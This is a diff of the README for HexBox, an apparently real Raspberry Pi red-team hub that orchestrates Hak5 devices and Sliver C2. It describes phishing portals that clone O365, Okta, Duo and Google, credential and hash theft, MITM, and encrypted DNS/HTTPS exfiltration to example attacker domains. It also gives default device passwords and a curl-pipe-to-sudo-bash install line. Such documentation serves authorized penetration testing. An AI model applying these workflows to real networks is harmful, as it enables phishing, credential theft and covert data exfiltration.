@@ -1,60 +1,97 @@
-# 🔥 HexBox — The Ultimate Red Team Multitool
+# ⬡ HexBox — Raspberry Pi Red Team Command Center
 
 > *"One box to rule them all."*
-![Alt text](/images/hexbox-banner.png)
-HexBox is a portable, all-in-one offensive security platform built around a **Raspberry Pi 3B** that orchestrates an arsenal of **Hak5 hardware** into a unified red team weapon system. Drop it in a backpack, plug it into a wall outlet, and run full-spectrum engagements from a single web dashboard.
 
-![Status](https://img.shields.io/badge/status-operational-red) ![Platform](https://img.shields.io/badge/platform-Raspberry%20Pi%203B-c51a4a) ![License](https://img.shields.io/badge/license-Authorized%20Use%20Only-black) ![Python](https://img.shields.io/badge/python-3.9%2B-blue)
+![HexBox Banner](/images/hexbox-banner.png)
+
+[![Status](https://img.shields.io/badge/status-operational-brightgreen)](https://github.com/aingram702/hexbox)
+[![Platform](https://img.shields.io/badge/platform-Raspberry%20Pi%203B-c51a4a)](https://www.raspberrypi.com/)
+[![Python](https://img.shields.io/badge/python-3.9%2B-3776AB)](https://www.python.org/)
+[![License](https://img.shields.io/badge/license-Authorized%20Use%20Only-black)](#license)
+
+HexBox is a portable, self-contained offensive security platform that turns a **Raspberry Pi 3B** into a full-spectrum red team command center. It orchestrates an arsenal of Hak5 attack hardware — WiFi Pineapple, Bash Bunny, LAN Turtle, OMG Plug, and more — through a single authenticated web dashboard, streaming captured intelligence in real time and enabling covert exfiltration from any network position.
+
+Drop it in a backpack. Plug it in. Own the engagement.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Legal Notice
 
 **This toolkit is for AUTHORIZED penetration testing and red team engagements ONLY.**
 
-You must have **explicit written permission** from the system/network owner before deploying any component of HexBox. Unauthorized use against systems you do not own or have permission to test is **illegal** and may result in criminal prosecution.
+You must have **explicit written permission** from the target system/network owner before deploying any component of HexBox. Unauthorized use is **illegal** and may result in criminal prosecution under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws worldwide.
 
-The authors assume **zero liability** for misuse. You are the operator. You are responsible.
+The authors and contributors assume **zero liability** for misuse. You are the operator — you are responsible for every action taken with this tool.
+
+---
+
+## Table of Contents
+
+- [What is HexBox?](#-what-is-hexbox)
+- [Architecture](#-architecture)
+- [Features](#-features)
+- [Hardware Requirements](#-hardware-requirements)
+- [Software Requirements](#-software-requirements)
+- [Quick Start](#-quick-start)
+- [Configuration](#-configuration)
+- [Dashboard Reference](#-dashboard-reference)
+- [Engagement Workflows](#-engagement-workflows)
+- [Credential Catcher](#-credential-catcher)
+- [Covert Exfiltration](#-covert-exfiltration)
+- [Mobile Companion App](#-mobile-companion-app)
+- [File Structure](#-file-structure)
+- [OPSEC](#-opsec)
+- [Troubleshooting](#-troubleshooting)
+- [Roadmap](#-roadmap)
+- [Contributing](#-contributing)
 
 ---
 
 ## 🎯 What is HexBox?
 
-HexBox turns a Raspberry Pi 3B into a **command-and-control hub** for the following Hak5 ecosystem devices — and more:
+HexBox is a **command-and-control hub** for the Hak5 hardware ecosystem. It integrates every attack device through a unified Flask dashboard that runs on the Pi and is accessible from any browser on your management network.
 
-| Device | Role |
-|--------|------|
-| 🍍 **WiFi Pineapple** | Wireless attacks, rogue AP, Evil Portal, handshake capture |
-| 🦈 **Shark Jack** | Drop-and-go network recon, fast nmap sweeps |
-| 🐿️ **Packet Squirrel** | Inline MITM, traffic capture, DNS spoofing |
-| 🐢 **LAN Turtle** | Persistent foothold, reverse SSH tunnels, Responder, Meterpreter |
-| 🔌 **OMG Plug** | Wireless HID payload delivery via DuckyScript |
-| 🐇 **Bash Bunny** | Multi-mode HID+ECM attacks, switch-selectable payloads |
-| 🐬 **Flipper Zero** | NFC/RFID cloning, Sub-GHz capture, BadUSB — serial bridge |
+| Device | Default IP | Role |
+|--------|------------|------|
+| 🍍 **WiFi Pineapple** | `172.16.42.1` | Rogue AP, Evil Portal, handshake capture, deauth |
+| 🦈 **Shark Jack** | `172.16.24.1` | Drop-and-go nmap recon, fast network sweeps |
+| 🐿️ **Packet Squirrel** | `172.16.32.1` | Inline MITM, traffic capture, DNS spoofing |
+| 🐢 **LAN Turtle** | `172.16.84.1` | Persistent foothold, AutoSSH reverse tunnel, Responder |
+| 🔌 **OMG Plug** | `192.168.1.50` | Wireless HID payload delivery via DuckyScript |
+| 🐇 **Bash Bunny** | `172.16.64.1` | Multi-mode HID+ECM attacks, switch-selectable payloads |
+| 🐬 **Flipper Zero** | `/dev/ttyACM0` | NFC/RFID cloning, Sub-GHz capture, BadUSB |
 
-Also integrates **Sliver C2** (implant generation and session management), **BloodHound CE** (AD graph auto-ingest), **Kismet** (GPS war-driving and wireless survey), and a **Mobile PWA Companion** (read-only Android/iOS dashboard via "Add to Home Screen").
-
-All controlled from a single **Flask-based C2 dashboard** running on the Pi.
+Also integrates: **Sliver C2** (implant generation + session management), **BloodHound CE** (AD attack path visualization), **Kismet** (GPS war-driving), and a **Mobile PWA** (read-only iOS/Android companion).
 
 ---
 
 ## 🏗️ Architecture
 
 ```
-                    ┌─────────────────────────────┐
-                    │       HexBox (Pi 3B)         │
-                    │    Command & Control Hub     │
-                    │  Flask Dashboard :1337        │
-                    │  Catcher :8000  Sliver :31337 │
-                    └──────────────┬───────────────┘
-                                   │ SSH / Serial / USB
-   ┌──────────┬──────────┬─────────┼──────────┬──────────┬──────────┬──────────┐
-   │          │          │         │          │          │          │          │
-┌──▼──┐  ┌───▼──┐  ┌────▼──┐  ┌───▼──┐  ┌───▼──┐  ┌───▼──┐  ┌────▼──┐  ┌────▼──┐
-│Pine │  │Shark │  │Packet │  │ LAN  │  │ OMG  │  │Bash  │  │Flipper│  │Sliver │
-│apple│  │ Jack │  │Squirrel│  │Turtle│  │ Plug │  │Bunny │  │ Zero  │  │  C2   │
-└─────┘  └──────┘  └───────┘  └──────┘  └──────┘  └──────┘  └───────┘  └───────┘
-  WiFi    Recon      MITM      Pivot      HID     HID+ECM   NFC/RFID   Implants
+                        ┌───────────────────────────────────┐
+                        │          HexBox (Pi 3B)            │
+                        │                                   │
+                        │  Flask C2 Dashboard  :1337        │
+                        │  Credential Catcher  :8000        │
+                        │  Sliver C2 Server    :31337       │
+                        │  BloodHound CE       :8080        │
+                        │  Kismet              :2501        │
+                        └──────────────┬────────────────────┘
+                                       │ SSH / Serial / USB
+        ┌──────┬──────┬────────┬───────┼───────┬──────┬────────┐
+        │      │      │        │       │       │      │        │
+      🍍      🦈      🐿️       🐢      🔌      🐇     🐬    Sliver
+   Pineapple  Shark  Packet  Turtle  OMG    Bunny  Flipper  Implants
+             Jack  Squirrel         Plug          Zero
+     WiFi    Recon   MITM   Pivot   HID   HID+ECM NFC/RFID  C2 agents
+```
+
+**Data flow:**
+```
+Target machines  ──(DuckyScript / Responder / MITM)──▶  loot/
+loot/            ──(parse_loot.py / parse_pcap.py)──▶  Intel tab
+Intel tab        ──(exfil.py)──▶  AES-256-GCM ──▶  DNS/HTTPS covert channel
+hashcat          ──(cracked.txt)──▶  SSE event ──▶  Cracked Passwords panel
 ```
 
 ---
@@ -62,160 +99,186 @@ All controlled from a single **Flask-based C2 dashboard** running on the Pi.
 ## 🧰 Features
 
 ### Core Platform
-- ✅ **Unified Web Dashboard** — 7-tab C2 interface: Devices, Intel, Payloads, Loot, Logs, Report, War-Drive
-- ✅ **Token Authentication** — Session-based login with configurable `HEXBOX_TOKEN`; all routes protected
-- ✅ **Real-Time Event Feed** — SSE-powered live activity stream; toast notifications for new loot and process events
-- ✅ **Engagement Sessions** — Named engagement tracking with start time, target, and notes
-- ✅ **Device Status Indicators** — Live ping dots with parallel reachability checks
+
+| Feature | Description |
+|---------|-------------|
+| **Unified Dashboard** | 7-tab authenticated web UI: Devices, Intel, Payloads, Loot, Logs, Report, War-Drive |
+| **Token Auth** | Session-based login + `X-HexBox-Token` header auth; all routes gated; configurable via `HEXBOX_TOKEN` env var |
+| **Live Event Feed** | Server-Sent Events push new loot, process changes, and crack events to every connected browser in real time |
+| **Engagement Sessions** | Named sessions with target, start time, and notes; used in generated reports |
+| **Software Updates** | One-click `git pull --rebase` from the dashboard; restart C2 without SSH |
+| **Device Status Dots** | Parallel background ping-checks for all 7 devices; green/red indicators update every refresh |
+| **Mobile PWA** | Read-only companion at `/mobile`; installable as home-screen app on Android/iOS |
 
 ### Intelligence & Analysis
-- ✅ **Loot Intelligence Engine** — `parse_loot.py` auto-parses all captured data into structured intel
-- ✅ **NTLM Hash Extraction** — Auto-discovers NTLMv1/v2 hashes from Responder logs with deduplication
-- ✅ **WiFi Credential Parsing** — Parses stolen WiFi profiles (SSID + plaintext password table)
-- ✅ **Network Map** — nmap XML parsing populates a sortable host/service/role table; role inference (DC, web server, printer, etc.)
-- ✅ **System Profile Collection** — Captures hostname, domain membership, IPs, local admins, AV products, running processes
-- ✅ **Active Directory Recon** — No-module LDAP enumeration: users, computers, domain admins
-- ✅ **BloodHound Auto-Ingest** — `bloodhound_collect.ps1` builds full BloodHound v5 JSON (users, computers, groups, domains with real SIDs); Intel tab shows summary; one-click upload to BloodHound CE via REST API
-- ✅ **PCAP Analysis Dashboard** — `parse_pcap.py` drives tshark to extract protocol hierarchy, HTTP Basic/form credentials, FTP/SMTP/Telnet cleartext creds, DNS queries, and top IP hosts; results rendered in the Intel tab with per-protocol credential tables
-- ✅ **Evil Portal Credential Capture** — Portal captures (username, password, source portal) displayed in the Intel tab with timestamps; all entries persisted to `loot/portals/captures.json`
-- ✅ **One-Click Report Generator** — Produces a self-contained HTML engagement report with all intel sections
+
+| Feature | Description |
+|---------|-------------|
+| **NTLM Hash Extraction** | Auto-parses NTLMv1/v2 hashes from all Responder log files; deduplicates; copy-to-clipboard |
+| **WiFi Credential Table** | Stolen WiFi profiles parsed from `.txt` dumps; SSID + plaintext password table |
+| **Network Map** | nmap XML auto-parsed into a sortable host/service/role table; DC, web server, and printer role inference |
+| **System Profiles** | Hostname, domain, local admins, IPs, AV products, running processes collected from target machines |
+| **AD Recon** | No-module LDAP enumeration of users, computers, and domain admins via pure .NET |
+| **BloodHound Ingest** | `bloodhound_collect.ps1` collects full BloodHound v5 JSON (users/computers/groups/domains with real SIDs); one-click upload to BloodHound CE REST API |
+| **PCAP Analysis** | tshark-driven extraction: protocol hierarchy, HTTP Basic/form creds, FTP/SMTP/Telnet cleartext, DNS queries, top hosts |
+| **Portal Captures** | Evil Portal phishing credentials (username/password/portal/timestamp) displayed in Intel tab; persisted to `loot/portals/captures.json` |
+| **Cracked Passwords** | Background file watcher detects hashcat writing `cracked.txt`; SSE event fires; Intel tab badge + table auto-refresh; both NTLMv2 and simple `HASH:plain` formats parsed |
+| **HTML Report** | One-click self-contained HTML engagement report covering all intel categories |
 
 ### Offense & Collection
-- ✅ **Bash Bunny Integration** — SSH device management, install switch payloads from dashboard, pull loot; `bunny_recon.sh` (ECM subnet sweep) and `bunny_exfil.sh` (HID+ECM Windows credential dump)
-- ✅ **Flipper Zero Serial Bridge** — pyserial bridge to `/dev/ttyACM0`; dashboard buttons for NFC detect, RFID read, Sub-GHz RX, BadUSB execution
-- ✅ **Sliver C2 Implant Generation** — Start/stop sliver-server daemon, generate implants (Windows/Linux/macOS × amd64/arm64 × exe/shellcode/shared), list active sessions, download generated implants
-- ✅ **Payload Builder** — Web UI generates custom DuckyScript for any of 5 payload types with configurable IP/port/delay
-- ✅ **Hashcat Integration** — Auto-extracts NTLMv2 hashes from Responder logs and launches hashcat (`-m 5600`) cracking
-- ✅ **PMKID Capture** — One-click hcxdumptool PMKID attack via Pineapple
-- ✅ **Monitor Mode Management** — airmon-ng monitor mode toggle from dashboard
-- ✅ **Credential Harvesting** — Responder LLMNR/NBT-NS poisoning, Chrome DPAPI exfil, WiFi profile theft
-- ✅ **MITM Suite** — Bettercap ARP spoofing, DNS spoofing, Packet Squirrel inline capture
-- ✅ **SSH Pivot** — LAN Turtle reverse tunnel to `hexbox_ip:2222` for internal access
-- ✅ **Persistent C2** — AutoSSH reverse tunnels via LAN Turtle + Meterpreter module
 
-### Phase 5 — Evil Portal / PCAP / War-Drive
-- ✅ **Custom Evil Portal Templates** — Four pixel-perfect phishing pages: O365, Okta, Duo, Google; configurable catcher IP/port and redirect URL; one-click deploy to WiFi Pineapple `/etc/evilportal/portal.html` via SSH
-- ✅ **Portal Preview & Download** — Preview any portal in-browser or download the customized HTML from the dashboard before deployment
-- ✅ **PCAP Analysis** — Upload `.pcap`/`.pcapng` files to `loot/pcaps/`; dashboard lists them; one-click tshark analysis extracts protocol stats, cleartext credentials (HTTP Basic, FTP, SMTP, Telnet), DNS queries, and top hosts
-- ✅ **GPS War-Drive with Kismet** — Start/stop Kismet from the dashboard; live AP table with SSID, BSSID, channel, signal, encryption, and GPS coordinates; Leaflet.js map with color-coded markers (green=open, red=encrypted); CSV and KML export for external mapping tools
-- ✅ **Kismet Integration** — REST API v2 polling (`/devices/views/phydot11_accesspoints/devices.json`); network cache persisted to `loot/wardrive/networks.json` so export works even when Kismet is offline; encryption decoded from `dot11.advertisedssid.crypt_set` bit flags
+| Feature | Description |
+|---------|-------------|
+| **Evil Portal Templates** | Four pixel-perfect phishing pages: O365, Okta, Duo, Google; configurable catcher IP/port + redirect URL; preview, download, or SSH-push to Pineapple |
+| **DuckyScript Payload Builder** | Web UI generates custom payloads for 5 attack types (reverse shell, Chrome exfil, WiFi steal, sysinfo, AD recon) with configurable IP/port/delay |
+| **Hashcat Integration** | Auto-extracts NTLMv2 hashes from Responder logs; launches `hashcat -m 5600` against rockyou; output feeds back to Intel tab |
+| **Bash Bunny Control** | Install switch payloads via SFTP; pull loot; `bunny_recon.sh` (ARP + nmap) and `bunny_exfil.sh` (HID+ECM Windows credential dump) |
+| **Flipper Zero Bridge** | pyserial bridge to `/dev/ttyACM0`; NFC detect, RFID read, Sub-GHz RX, BadUSB from the dashboard |
+| **Sliver C2** | Start/stop `sliver-server daemon`; generate implants (Windows/Linux/macOS × amd64/arm64 × exe/shellcode/shared); list active sessions; download implants |
+| **PMKID Capture** | One-click hcxdumptool PMKID attack via Pineapple API |
+| **Monitor Mode** | airmon-ng toggle for the Pineapple adapter from the dashboard |
+| **Responder** | LLMNR/NBT-NS/MDNS poisoning; output auto-parsed into Intel tab hashes |
+| **Bettercap MITM** | ARP spoofing + DNS spoofing on the management interface |
+| **Covert Exfil** | AES-256-GCM + gzip → DNS subdomain queries or HTTPS POST; background dispatch; default-key warning |
 
-### Phase 6 — Covert Exfil / Mobile Companion / Cracked Password Loop
-- ✅ **Encrypted DNS Exfil** — AES-256-GCM + gzip compression → base32 → raw UDP DNS subdomain queries; no external dependencies (pure stdlib socket); format: `{seq}.{chunk}.{session}.exfil.{domain}`; throttled to avoid rate limiting; terminator packet carries total chunk count for receiver reassembly
-- ✅ **Encrypted HTTPS Exfil** — AES-256-GCM + gzip → base64 JSON POST to attacker C2 endpoint; configurable auth token; TLS verification toggle; all via `requests` (already installed)
-- ✅ **Covert Exfil UI** — Devices tab panel: select DNS or HTTPS method, choose individual file or full loot archive, one-click send; config summary shows DNS domain / HTTPS URL / AES key status; live exfil log output; file picker populated with current loot tree
-- ✅ **Mobile Companion PWA** — Read-only dashboard at `/mobile`; shows ops summary (hash count, WiFi creds, hosts, cracked passwords, portal captures, war-drive networks); real-time process list; SSE-powered live feed for loot/process/crack events; PWA manifest at `/mobile/manifest.json` — tap "Add to Home Screen" on Android/iOS for app-like access; no APK build required
-- ✅ **Cracked Password Feedback Loop** — Background loot watcher detects `cracked.txt` modification events (hashcat writes to this file); broadcasts `hash_cracked` SSE event; Intel tab **Cracked Passwords** section refreshes automatically; `parse_cracked_passwords()` handles both NTLMv2 (`USER::DOMAIN:...:plaintext`) and simple `HASH:plaintext` formats; SSE toast notification on crack; badge on Intel tab shows count; one-click copy of all plaintexts
+### Operational Support
 
-### Operations
-- ✅ **Loot File Browser** — Download any captured file directly from the dashboard
-- ✅ **Process Management** — Start/stop all background services with whitelist-enforced kill buttons
-- ✅ **Log Viewer** — Real-time log tail for all services with auto-refresh
-- ✅ **"Engage" Button** — Single script launches full assessment with graceful Ctrl+C shutdown
-- ✅ **OPSEC Hardening** — MAC randomization, hostname spoofing, GPG loot encryption, configurable interfaces
+| Feature | Description |
+|---------|-------------|
+| **GPS War-Drive** | Kismet REST API polling; live AP table (SSID, BSSID, channel, signal, encryption, GPS); Leaflet.js map with color-coded markers; CSV and KML export |
+| **Loot Browser** | Download any captured file directly from the dashboard; tree grouped by category |
+| **Log Viewer** | Real-time tail for all service logs; service selector + line count controls |
+| **Process Manager** | Start/stop all background processes with whitelist-enforced kill buttons |
+| **Engage Script** | `scripts/engage.sh` launches Pineapple, Responder, catcher, dashboard, and listeners in one shot; graceful Ctrl+C shutdown |
+| **OPSEC Hardening** | `scripts/opsec.sh`: MAC randomization, hostname spoofing, bash history suppression, GPG loot encryption |
+| **Pre-flight Check** | `scripts/preflight.py`: SSH-tests all devices, validates Python deps, checks tool installs, outputs GO/NO-GO |
 
 ---
 
 ## 📦 Hardware Requirements
 
-### Core
-- **Raspberry Pi 3B** (or 3B+ / 4)
-- 64GB+ Class 10 microSD card
-- 20,000mAh USB-C power bank
-- Powered USB hub (4+ ports, 2A per port)
-- USB-to-Ethernet adapter (the Pi's onboard NIC is occupied)
+### Core (Required)
 
-### Hak5 Arsenal
-- WiFi Pineapple (Mark VII or Enterprise)
-- Shark Jack
-- Packet Squirrel (Mark II recommended)
-- LAN Turtle
-- OMG Plug (or OMG Cable / Adapter)
-- **Bash Bunny** (Mark II) — connects at 172.16.64.1 in arming mode
+| Component | Notes |
+|-----------|-------|
+| **Raspberry Pi 3B** (or 3B+/4) | The hub — runs all C2 software |
+| **64GB+ Class 10 microSD** | Faster cards improve tshark and hashcat I/O |
+| **20,000 mAh USB-C power bank** | ~8–10 hour runtime in the field |
+| **Powered USB hub** (4+ ports, 2A/port) | Required — Pi USB ports can't power Hak5 devices simultaneously |
+| **USB-to-Ethernet adapter** | The Pi's onboard NIC is used for management; a second NIC handles Responder/MITM |
 
-### Phase 4 Add-ons
-- **Flipper Zero** — connected via USB (appears as `/dev/ttyACM0`); requires pyserial (`pip install pyserial`)
-- **Sliver C2** — install on the Pi: `curl https://sliver.sh/install | sudo bash`
-- **BloodHound CE** — install separately; configure URL and credentials in `config.json`
+### Hak5 Arsenal (Optional — use what you have)
 
-### Phase 5 Add-ons
-- **Kismet** — wireless survey + GPS war-driving: `sudo apt install kismet`; configure with `kismet_site.conf` and set credentials in `config.json → kismet`
-- **tshark** — PCAP analysis backend: `sudo apt install tshark`; part of the `wireshark-common` package
-- **GPS receiver** (optional) — any USB/serial GPSd-compatible receiver for coordinate logging during war-drives
+| Device | Arming Mode IP | Required for |
+|--------|---------------|--------------|
+| WiFi Pineapple (Mark VII or Enterprise) | `172.16.42.1` | Rogue AP, Evil Portal, handshake capture |
+| Shark Jack | `172.16.24.1` | Drop recon, nmap sweeps |
+| Packet Squirrel (Mark II recommended) | `172.16.32.1` | Inline MITM, PCAP capture |
+| LAN Turtle | `172.16.84.1` | AutoSSH foothold, Responder, pivot |
+| OMG Plug / OMG Cable / OMG Adapter | `192.168.1.50` | HID payload delivery |
+| Bash Bunny (Mark II) | `172.16.64.1` | HID + ECM credential exfil |
+| Flipper Zero | `/dev/ttyACM0` | NFC/RFID, Sub-GHz, BadUSB |
 
-### Phase 6 Add-ons
-- **DNS exfil receiver** — A DNS authoritative nameserver for your `dns_domain` that logs all incoming queries; reassemble base32 chunks by session ID and sequence number; no server-side software is included in this repo — use `tcpdump`, `dnscat2-server`, or a custom DNS log parser
-- **HTTPS exfil receiver** — Any HTTP(S) endpoint that accepts `POST /` with `{"data": "<base64>", "session": "...", "ts": "..."}` body; decrypt with the matching `aes_key` using AES-256-GCM (nonce=first 12 bytes, tag=next 16 bytes)
-- **pycryptodome** — AES-256-GCM encryption (already in `requirements.txt`)
+### Optional Accessories
 
-### Optional but Recommended
-- 3.5" touchscreen HAT (for headless field ops)
-- External 1TB SSD for loot storage
-- Pelican 1200 case
-- Travel router (for off-site C2 callback)
+- 3.5" touchscreen HAT (headless field ops without a laptop)
+- External 1TB USB SSD for loot storage (recommended for long engagements)
+- Pelican 1200 case (drop-proof, inconspicuous)
+- Travel router (routes callbacks through a different ISP for off-site C2)
 
 ---
 
-## 🚀 Installation
+## 💾 Software Requirements
 
-### 1. Flash the Pi
-Use Raspberry Pi Imager to write **Raspberry Pi OS Lite (64-bit)** to your SD card. Enable SSH in the imager's advanced options.
+| Tool | Install | Required for |
+|------|---------|--------------|
+| Python 3.9+ | included on Pi OS | All C2 components |
+| nmap | `sudo apt install nmap` | Network scanning |
+| Responder | `sudo apt install responder` | LLMNR/NBT-NS poisoning |
+| Bettercap | `sudo apt install bettercap` | ARP/DNS MITM |
+| hashcat | `sudo apt install hashcat` | NTLMv2 cracking |
+| tshark | `sudo apt install tshark` | PCAP analysis |
+| Kismet | `sudo apt install kismet` | GPS war-driving |
+| hcxdumptool | `sudo apt install hcxdumptool` | PMKID capture |
+| aircrack-ng | `sudo apt install aircrack-ng` | Monitor mode, handshake cracking |
+| Sliver C2 | `curl https://sliver.sh/install \| sudo bash` | Implant generation |
+| BloodHound CE | See [BloodHound docs](https://support.bloodhoundenterprise.io/) | AD attack paths |
+| gpsd | `sudo apt install gpsd gpsd-clients` | GPS war-driving coordinates |
 
-### 2. Clone & Run Setup
+All Python dependencies are installed automatically by `setup/hexbox_setup.sh`:
+
+```
+flask  paramiko  requests  pycryptodome  scapy  impacket  netaddr  colorama
+```
+
+---
+
+## 🚀 Quick Start
+
 ```bash
+# 1. Flash Raspberry Pi OS Lite (64-bit) to your SD card via Raspberry Pi Imager
+#    Enable SSH in the imager's advanced options before writing.
+
+# 2. Boot the Pi and SSH in
 ssh pi@<pi-ip>
-git clone https://github.com/yourhandle/hexbox.git ~/hexbox
+
+# 3. Clone and provision
+git clone https://github.com/aingram702/hexbox.git ~/hexbox
 cd ~/hexbox
 chmod +x setup/hexbox_setup.sh
-sudo ./setup/hexbox_setup.sh
-```
+sudo ./setup/hexbox_setup.sh   # installs all tools + Python deps
 
-The setup script installs the entire offensive toolchain: nmap, aircrack-ng, Responder, Bettercap, Metasploit, hashcat, and all Python dependencies.
-
-### 3. Configure
-```bash
+# 4. Configure for your environment (one-time interactive setup)
 bash setup/configure.sh
+
+# 5. Pre-flight check
+sudo python3 scripts/preflight.py
+
+# 6. Launch
+sudo python3 ~/hexbox/c2/hexbox_c2.py &    # C2 dashboard  → :1337
+python3 ~/hexbox/c2/catcher.py &           # Catcher server → :8000
+
+# 7. Open dashboard
+http://<pi-ip>:1337
 ```
 
-This interactive script prompts for your attacker IP and device credentials **once**, writes `config.json`, and automatically propagates your IP into every payload file — no manual editing of multiple files required.
-
-### 4. Reboot
-```bash
-sudo reboot
-```
+> **Access token**: on first launch the token is printed to stdout. Set it permanently with `export HEXBOX_TOKEN="<your-token>"` or add `"api_token": "..."` to `config.json → hexbox`.
 
 ---
 
-## ⚙️ Configuration — **READ THIS BEFORE DEPLOYING**
+## ⚙️ Configuration
 
-> 🚨 **HexBox will NOT work out of the box.** Every environment is different, and you **must** customize it to match your network topology, device IPs, and target environment.
+> 🚨 **HexBox will not work out of the box.** Your environment has different IPs and device passwords. Run `setup/configure.sh` once before deploying.
 
-### One-Command Setup (Recommended)
+### One-Command Setup
 
 ```bash
 bash setup/configure.sh
 ```
 
-Prompts you for:
-- Your HexBox / attacker IP (replaces `10.0.0.99` in all payload files automatically)
-- Default target scan subnet
-- External C2 server IP
-- Passwords for each Hak5 device
+Prompts you for every configurable value — attacker IP, device passwords, exfil settings — and writes everything to `config.json`. Also propagates your attacker IP into all payload files automatically.
 
-Writes everything to **`config.json`** — the single source of truth loaded by all Python scripts.
+### config.json Reference
 
-### Manual Configuration
-
-Edit **`config.json`** in the repo root:
+The full structure after `setup/configure.sh`:
 
 ```json
 {
   "hexbox": {
-    "ip": "10.0.0.99",
-    "scan_target": "192.168.1.0/24"
+    "ip":             "10.0.0.99",       // HexBox attacker IP
+    "dashboard_port": 1337,
+    "catcher_port":   8000,
+    "loot_dir":       "~/hexbox/loot",
+    "log_dir":        "~/hexbox/logs",
+    "scan_target":    "192.168.1.0/24",  // default nmap target
+    "api_token":      ""                 // optional: pin the dashboard token
+  },
+  "interfaces": {
+    "management": "wlan0",   // Bettercap interface
+    "responder":  "eth0"     // Responder / wired interface
   },
   "devices": {
-    "pineapple":      {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple"},
+    "pineapple":      {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple", "api_port": 1471},
     "sharkjack":      {"ip": "172.16.24.1",  "user": "root", "pass": "hak5shark"},
     "packetsquirrel": {"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
     "lanturtle":      {"ip": "172.16.84.1",  "user": "root", "pass": "hak5turtle"},
@@ -225,383 +288,567 @@ Edit **`config.json`** in the repo root:
   "flipper":    {"serial_port": "/dev/ttyACM0"},
   "bloodhound": {"url": "http://localhost:8080", "username": "admin", "password": "BloodHound!"},
   "sliver":     {"host": "127.0.0.1", "port": 31337},
-  "c2": {
-    "external_ip": "YOUR.C2.IP.HERE"
-  },
-  "kismet": {
-    "url":      "http://localhost:2501",
-    "username": "kismet",
-    "password": "kismet"
+  "kismet":     {"url": "http://localhost:2501", "username": "kismet", "password": "kismet"},
+  "c2":         {"external_ip": "YOUR.C2.IP.HERE", "port": 443},
+  "exfil": {
+    "dns_domain":       "",               // e.g. "exfil.attacker.com"
+    "dns_server":       "8.8.8.8",        // IP of your authoritative NS
+    "https_url":        "",               // e.g. "https://attacker.com/upload"
+    "https_token":      "",               // bearer token for HTTPS endpoint
+    "aes_key":          "change-me-to-32-byte-secret-key!",  // CHANGE THIS
+    "https_verify_tls": true
   }
 }
 ```
 
-`hexbox_c2.py`, `catcher.py`, and `pineapple_auto.py` all load from this file. After editing, propagate the IP to payload files:
+### Additional Setup
 
+#### LAN Turtle AutoSSH
+For reverse tunnels to work, you need a **public VPS** the Turtle can phone home to:
+1. Create a `tunnel` user with restricted shell on your VPS
+2. Run `setup/configure.sh` and enter the VPS IP when prompted for `TURTLE_IP`
+3. Or manually edit `payloads/turtle_foothold.sh` and set `SERVER=<your-vps-ip>`
+
+#### WiFi Interface Names
+Defaults assume `wlan0` (Pi built-in) for Bettercap and `eth0` for Responder. Check your interface names:
 ```bash
-grep -rl "10.0.0.99" ~/hexbox/payloads/ | xargs sed -i 's/10.0.0.99/YOUR.IP.HERE/g'
+ip link show
 ```
+Update `config.json → interfaces` to match your setup.
 
-### Additional Required Steps
-
-#### 🐢 LAN Turtle AutoSSH
-For the reverse tunnel to work:
-- A **public IP or VPS** the LAN Turtle can phone home to
-- A `tunnel` user on that host with key-based SSH auth
-- Edit `SERVER=<YOUR_HEXBOX_PUBLIC_IP>` in `payloads/turtle_foothold.sh`
-
-#### 📡 WiFi Interface Names
-Defaults assume `wlan0` (Pi built-in) and `wlan1mon` (Pineapple). If using external adapters, update interface references in:
-- `c2/hexbox_c2.py` (Bettercap, Responder routes)
-- `scripts/opsec.sh` (MAC rotation loop)
-
-#### 📁 External SSD for Loot (Optional)
+#### External SSD for Loot
 ```bash
 sudo mount /dev/sda1 /mnt/ssd
 rm -rf ~/hexbox/loot
 ln -s /mnt/ssd/loot ~/hexbox/loot
 ```
 
-#### 🔒 Dashboard Authentication
-The C2 dashboard is **token-protected by default**. On startup it prints a random access token — set it permanently via environment variable:
-
+#### Running as a Service
+To survive reboots, create a systemd unit:
 ```bash
-export HEXBOX_TOKEN="your-strong-secret-here"
-sudo -E python3 ~/hexbox/c2/hexbox_c2.py
-```
+sudo tee /etc/systemd/system/hexbox.service << 'EOF'
+[Unit]
+Description=HexBox C2 Dashboard
+After=network.target
 
-Or add `"api_token": "your-token"` to `config.json` under `"hexbox"`. All routes require a valid session or `X-HexBox-Token` header.
+[Service]
+User=root
+WorkingDirectory=/home/pi/hexbox
+Environment=HEXBOX_TOKEN=your-strong-secret-here
+ExecStart=/usr/bin/python3 /home/pi/hexbox/c2/hexbox_c2.py
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable hexbox
+sudo systemctl start hexbox
+```
 
 ---
 
-### Configuration Sanity Check
+## 🖥️ Dashboard Reference
 
-Run the included pre-flight check before going on-site:
+Navigate to `http://<pi-ip>:1337` and log in with your access token.
 
-```bash
-sudo python3 scripts/preflight.py
-```
+### Devices Tab
 
-This will:
-- Ping every configured Hak5 device and test SSH credentials
-- Verify Python packages and required tools are installed
-- Confirm required services are running
-- Validate loot directory structure is correct
-- Check OPSEC posture (MAC randomization, hostname, firewall)
-- Output a GO / NO-GO decision with a JSON report
+The primary control surface. Contains one card per device plus system controls.
+
+| Card | Key Controls |
+|------|-------------|
+| **WiFi Pineapple** | Start/stop management AP; trigger deauth; run handshake capture; deploy Evil Portal |
+| **Shark Jack** | Trigger nmap recon sweep; pull loot to `loot/shark/` |
+| **Packet Squirrel** | Start/stop inline PCAP capture; pull capture files |
+| **LAN Turtle** | Provision modules; trigger AutoSSH reverse tunnel |
+| **OMG Plug** | Deploy payloads wirelessly; trigger browser exfil, WiFi steal, AD recon |
+| **Bash Bunny** | Install Switch1/Switch2 payloads; pull loot; run SSH-triggered commands |
+| **Flipper Zero** | NFC detect, RFID read, Sub-GHz RX, BadUSB — via serial bridge |
+| **Pi Local** | Responder, Bettercap MITM, handshake crack, hashcat |
+| **Sliver C2** | Start/stop server; generate implants; view active sessions |
+| **Covert Exfil** | Package + encrypt + send loot over DNS or HTTPS |
+| **System** | Software updates; C2 restart; live activity feed |
+
+### Intel Tab
+
+All captured intelligence in one place.
+
